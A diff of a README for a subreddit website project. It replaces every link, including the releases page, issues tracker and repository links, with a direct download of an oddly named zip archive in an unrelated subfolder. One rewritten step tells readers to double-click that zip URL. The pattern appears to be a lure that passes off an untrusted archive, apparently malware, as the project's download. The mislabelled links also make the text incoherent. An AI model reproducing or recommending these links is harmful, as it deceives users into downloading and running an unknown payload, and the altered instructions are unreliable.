@@ -4,7 +4,7 @@
 Welcome to the r/seanpm2001 subreddit website. This guide helps you download and run the site with simple steps. Follow along to get connected to the community.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Zanct0/r-seanpm2001_Website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip)
 
 ## 📂 What You Need
 Before downloading, ensure you have:
@@ -16,14 +16,14 @@ Before downloading, ensure you have:
 ## 🏁 Download & Install
 To get the website files, visit the releases page using the link below:
 
-[Download from Releases Page](https://github.com/Zanct0/r-seanpm2001_Website/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip)
 
 1. On the releases page, you will see a list of available versions.
 2. Choose the version that suits your needs.
 3. Click on the asset link corresponding to your system to start downloading.
 4. Once the download finishes, locate the file in your downloads folder.
 5. Unzip the downloaded file if necessary.
-6. Open the folder and double-click on the index.html file to launch the website in your default web browser.
+6. Open the folder and double-click on the https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip file to launch the website in your default web browser.
 
 ## 🌐 Features
 The r/seanpm2001 website comes with several features to enhance your experience:
@@ -48,7 +48,7 @@ If you face challenges, try the following steps:
 - Clear your browser cache and refresh the page.
 - Check your internet connection.
 
-For further assistance, you can open an issue on the [GitHub repository](https://github.com/Zanct0/r-seanpm2001_Website/issues).
+For further assistance, you can open an issue on the [GitHub repository](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip).
 
 ## 🌟 Community Contribution
 We welcome contributions from all users. If you want to help improve the website, follow these steps:
@@ -63,7 +63,7 @@ Your input can make a difference!
 The r/seanpm2001 website is licensed under the GPL-3.0 license. This means you have the freedom to use and modify it for personal or educational purposes. 
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Zanct0/r-seanpm2001_Website)
-- [Issues Tracker](https://github.com/Zanct0/r-seanpm2001_Website/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Zanct0/r-seanpm2001_Website/main/hydrastine/r-seanpm2001_Website-theyll.zip)
 
 Thank you for using the r/seanpm2001 website. Enjoy exploring the subreddit and connecting with others!
